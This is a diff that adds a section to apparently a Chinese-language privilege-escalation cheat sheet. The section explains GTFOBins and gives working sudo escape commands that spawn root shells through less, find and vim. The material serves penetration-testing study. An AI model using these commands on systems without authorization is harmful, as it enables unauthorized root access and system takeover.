@@ -3,6 +3,28 @@
 
 ---
 
+## 🔍 Sudo 配合 GTFOBins 逃逸利用
+GTFOBins 是一個精心策劃的 Unix 二進制檔案列表，這些檔案可用於繞過配置錯誤系統中的本地安全限制。
+當普通使用者被賦予了 `sudo` 特權（可由 `sudo -l` 檢出），如果該指令被列在 GTFOBins 中，通常可以利用該工具內建的互動功能（如讀取檔案、呼叫 Shell、執行 Python/Perl 腳本等）來逃逸當前環境，直接取得目標使用者或 `root` 的權限。
+
+### 🛠️ 常見二進制檔案 Sudo 逃逸範例
+
+*   **Less / More**：
+    ```bash
+    sudo less /etc/profile
+    # 在 less 介面中輸入 !/bin/sh 即可取得 shell
+    ```
+*   **Find**：
+    ```bash
+    sudo find . -exec /bin/sh \; -quit
+    ```
+*   **Vim**：
+    ```bash
+    sudo vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+    ```
+
+---
+
 ## 💥 Sudo Service 提權
 當使用者被授權可以免密碼以其他使用者（或 `root`）權限執行 `/usr/sbin/service` 命令時，可以利用 GTFOBins 逃逸技巧，執行相對路徑引導至互動式 Shell。
 
